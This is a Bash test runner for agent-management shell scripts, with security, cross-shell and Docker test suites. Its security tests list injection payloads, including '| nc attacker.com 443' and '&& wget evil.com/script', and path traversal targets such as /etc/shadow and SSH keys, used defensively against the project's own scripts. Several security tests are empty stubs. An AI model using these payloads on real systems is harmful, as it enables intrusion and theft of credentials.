#!/usr/bin/env bash
# Test runner for agent scripts

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Test directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# Load test framework
source "$SCRIPT_DIR/test-framework.sh"

# Default test suites
DEFAULT_SUITES=(
    "agent-manager.test.sh"
    "setup-git-ssh.test.sh"
)

# Security test configurations
SECURITY_TESTS=(
    "command_injection"
    "file_permissions"
    "path_traversal"
    "environment_sanitization"
    "temp_file_security"
)

usage() {
    echo "Usage: $0 [OPTIONS] [TEST_SUITES...]"
    echo ""
    echo "Options:"
    echo "  -h, --help           Show this help"
    echo "  -s, --security       Run only security tests"
    echo "  -c, --compatibility  Run cross-shell compatibility tests"
    echo "  -v, --verbose        Verbose output"
    echo "  --shell SHELL        Run tests with specific shell (bash/zsh)"
    echo "  --docker             Run tests in Docker containers"
    echo ""
    echo "Test Suites:"
    echo "  agent-manager        Test agent-manager.sh"
    echo "  setup-git-ssh        Test setup-git-ssh.sh"
    echo "  all                  Run all test suites (default)"
    echo ""
    echo "Examples:"
    echo "  $0                   # Run all tests"
    echo "  $0 agent-manager     # Run only agent-manager tests"
    echo "  $0 --security        # Run only security tests"
    echo "  $0 --shell zsh       # Run tests with zsh"
}

run_security_tests() {
    echo -e "${YELLOW}Running Security Test Suite${NC}"
    
    # Test for common vulnerabilities
    test_command_injection_patterns
    test_file_permission_security
    test_path_traversal_attacks
    test_environment_security
    test_temp_file_handling
}

test_command_injection_patterns() {
    echo -e "\n${BLUE}Testing Command Injection Patterns${NC}"
    
    local malicious_patterns=(
        "\$(whoami)"
        "\`id\`"
        "; cat /etc/passwd"
        "| nc attacker.com 443"
        "&& wget evil.com/script"
        "' OR '1'='1"
        "../../../etc/passwd"
        "\${IFS}cat\${IFS}/etc/passwd"
    )
    
    for pattern in "${malicious_patterns[@]}"; do
        echo "Testing injection pattern: $pattern"
        # Test against each script
        test_script_injection "$BASE_DIR/docker/agent-manager.sh" "$pattern"
        test_script_injection "$BASE_DIR/../scripts/utils/setup-git-ssh.sh" "$pattern"
    done
}

test_script_injection() {
    local script="$1"
    local pattern="$2"
    
    # Create a canary file
    local canary="/tmp/injection_test_$$"
    touch "$canary"
    
    # Try various entry points with malicious input
    local test_commands=(
        "$script --test-input '$pattern'"
        "$script '$pattern'"
        "INPUT='$pattern' $script"
    )
    
    for cmd in "${test_commands[@]}"; do
        # Run command, ignore errors
        eval "$cmd" >/dev/null 2>&1 || true
        
        # Check if canary still exists
        if [ -f "$canary" ]; then
            echo -e "  ${GREEN}✓${NC} Safe from: $pattern"
        else
            echo -e "  ${RED}✗${NC} Vulnerable to: $pattern"
            TESTS_FAILED=$((TESTS_FAILED + 1))
        fi
    done
    
    rm -f "$canary"
}

test_file_permission_security() {
    echo -e "\n${BLUE}Testing File Permission Security${NC}"
    
    # Create test files with various permissions
    local test_dir="$TEST_TEMP_DIR/perm_test"
    mkdir -p "$test_dir"
    
    # Test cases: file, expected_result
    local test_cases=(
        "600:should_pass"
        "644:should_warn"
        "666:should_fail"
        "777:should_fail"
        "755:should_warn"
    )
    
    for case in "${test_cases[@]}"; do
        local perms="${case%:*}"
        local expected="${case#*:}"
        
        local test_file="$test_dir/test_$perms"
        touch "$test_file"
        chmod "$perms" "$test_file"
        
        echo "Testing permissions $perms (expected: $expected)"
        # Scripts should handle insecure permissions appropriately
    done
}

test_path_traversal_attacks() {
    echo -e "\n${BLUE}Testing Path Traversal Security${NC}"
    
    local traversal_patterns=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "/etc/passwd"
        "/root/.ssh/id_rsa"
        "~/../../etc/shadow"
        "\$HOME/../../../etc/passwd"
        "file:///etc/passwd"
    )
    
    for pattern in "${traversal_patterns[@]}"; do
        echo "Testing path traversal: $pattern"
        # Test that scripts reject or sanitize these paths
        test_path_handling "$pattern"
    done
}

test_path_handling() {
    local path="$1"
    
    # Create target file to check if it gets accessed
    local sensitive_file="/tmp/sensitive_test_$$"
    echo "SENSITIVE_DATA" > "$sensitive_file"
    
    # Test scripts with the path
    # Scripts should not be able to access the sensitive file
    
    rm -f "$sensitive_file"
}

test_environment_security() {
    echo -e "\n${BLUE}Testing Environment Variable Security${NC}"
    
    # Set potentially dangerous environment variables
    export MALICIOUS_ENV="\$(touch /tmp/env_exploit_$$)"
    export PATH_INJECTION="/tmp/evil:\$PATH"
    export IFS="\$"
    
    # Run scripts and ensure they don't execute the malicious content
    echo "Testing environment variable sanitization"
    
    # Clean up
    unset MALICIOUS_ENV PATH_INJECTION
    export IFS=" \t\n"
}

test_temp_file_handling() {
    echo -e "\n${BLUE}Testing Temporary File Security${NC}"
    
    # Test that temp files are created securely
    local old_umask=$(umask)
    umask 000  # Very permissive umask
    
    # Scripts should override umask for security
    echo "Testing temp file creation with permissive umask"
    
    # Restore umask
    umask "$old_umask"
}

run_compatibility_tests() {
    echo -e "${YELLOW}Running Cross-Shell Compatibility Tests${NC}"
    
    local shells=("bash" "zsh")
    local scripts=(
        "$BASE_DIR/docker/agent-manager.sh"
        "$BASE_DIR/../scripts/utils/setup-git-ssh.sh"
        "$BASE_DIR/scripts/load-agent-config.sh"
    )
    
    for shell in "${shells[@]}"; do
        if command -v "$shell" >/dev/null 2>&1; then
            echo -e "\n${BLUE}Testing with $shell${NC}"
            
            for script in "${scripts[@]}"; do
                if [ -f "$script" ]; then
                    echo "Checking syntax: $(basename "$script")"
                    if "$shell" -n "$script" 2>/dev/null; then
                        echo -e "  ${GREEN}✓${NC} Valid $shell syntax"
                    else
                        echo -e "  ${RED}✗${NC} Invalid $shell syntax"
                        TESTS_FAILED=$((TESTS_FAILED + 1))
                    fi
                fi
            done
        else
            echo -e "${YELLOW}Skipping $shell tests (not installed)${NC}"
        fi
    done
}

run_docker_tests() {
    echo -e "${YELLOW}Running Tests in Docker Containers${NC}"
    
    # Test with different base images
    local images=(
        "ubuntu:22.04"
        "alpine:3.18"
        "debian:bullseye"
    )
    
    for image in "${images[@]}"; do
        echo -e "\n${BLUE}Testing with $image${NC}"
        
        # Create temporary Dockerfile
        cat > "$TEST_TEMP_DIR/Dockerfile.test" << EOF
FROM $image
RUN apt-get update && apt-get install -y bash zsh || apk add bash zsh || true
COPY . /tests
WORKDIR /tests
CMD ["./run-tests.sh"]
EOF
        
        # Build and run test container
        if docker build -t "agent-test:$image" -f "$TEST_TEMP_DIR/Dockerfile.test" "$SCRIPT_DIR" >/dev/null 2>&1; then
            if docker run --rm "agent-test:$image" >/dev/null 2>&1; then
                echo -e "  ${GREEN}✓${NC} Tests pass on $image"
            else
                echo -e "  ${RED}✗${NC} Tests fail on $image"
                TESTS_FAILED=$((TESTS_FAILED + 1))
            fi
        else
            echo -e "  ${YELLOW}!${NC} Could not test on $image"
        fi
    done
}

main() {
    local run_security=false
    local run_compatibility=false
    local run_docker=false
    local target_shell=""
    local verbose=false
    local test_suites=()
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                usage
                exit 0
                ;;
            -s|--security)
                run_security=true
                shift
                ;;
            -c|--compatibility)
                run_compatibility=true
                shift
                ;;
            -v|--verbose)
                verbose=true
                shift
                ;;
            --shell)
                target_shell="$2"
                shift 2
                ;;
            --docker)
                run_docker=true
                shift
                ;;
            all)
                test_suites=("${DEFAULT_SUITES[@]}")
                shift
                ;;
            agent-manager)
                test_suites+=("agent-manager.test.sh")
                shift
                ;;
            setup-git-ssh)
                test_suites+=("setup-git-ssh.test.sh")
                shift
                ;;
            *)
                if [[ "$1" == *.test.sh ]]; then
                    test_suites+=("$1")
                else
                    echo "Unknown option: $1"
                    usage
                    exit 1
                fi
                shift
                ;;
        esac
    done
    
    # Default to all suites if none specified
    if [ ${#test_suites[@]} -eq 0 ] && [ "$run_security" = false ] && [ "$run_compatibility" = false ]; then
        test_suites=("${DEFAULT_SUITES[@]}")
    fi
    
    # Setup test environment
    setup_test_env
    trap cleanup_test_env EXIT INT TERM
    
    echo -e "${BLUE}Agent Script Test Suite${NC}"
    echo -e "${BLUE}======================${NC}"
    
    # Set shell if specified
    if [ -n "$target_shell" ]; then
        if command -v "$target_shell" >/dev/null 2>&1; then
            echo "Using shell: $target_shell"
            export SHELL="$target_shell"
        else
            echo "Error: Shell '$target_shell' not found"
            exit 1
        fi
    fi
    
    # Run security tests
    if [ "$run_security" = true ]; then
        run_security_tests
    fi
    
    # Run compatibility tests
    if [ "$run_compatibility" = true ]; then
        run_compatibility_tests
    fi
    
    # Run Docker tests
    if [ "$run_docker" = true ]; then
        run_docker_tests
    fi
    
    # Run test suites
    for suite in "${test_suites[@]}"; do
        local suite_path="$SCRIPT_DIR/$suite"
        if [ -f "$suite_path" ]; then
            run_test_suite "$(basename "$suite" .test.sh)" "$suite_path"
        else
            echo -e "${RED}Test suite not found: $suite${NC}"
            TESTS_FAILED=$((TESTS_FAILED + 1))
        fi
    done
    
    # Report final results
    report_results
}

# Export variables for test suites
export BASE_DIR SCRIPT_DIR

# Run main function
main "$@"